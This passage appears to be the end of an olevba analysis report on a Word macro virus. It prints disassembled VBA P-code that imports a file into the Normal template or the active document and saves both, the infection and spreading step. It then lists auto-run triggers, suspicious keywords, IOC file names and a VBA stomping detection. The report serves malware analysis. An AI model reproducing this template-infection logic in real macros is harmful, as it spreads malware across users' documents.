' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #630:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Umang_Fa"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St mmf78116 
' 	EndIf 
' Line #631:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #632:
' 	Ld xxx902578112 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld mmf78116 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set o7811902511 
' 	EndIf 
' Line #633:
' 	Ld xxx902578112 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld mmf78116 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set o7811902511 
' 	EndIf 
' Line #634:
' 	LitStr 0x0019 "c:\windows\system\vxd.sys"
' 	Ld o7811902511 
' 	ArgsMemCall Import 0x0001 
' Line #635:
' 	Ld activeinst 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #636:
' 	Ld mmf78116 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #637:
' 	Label bodo 
' Line #638:
' 	EndFunc 
' Line #639:
' Line #640:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |zap.bat             |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
|IOC       |start.exe           |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

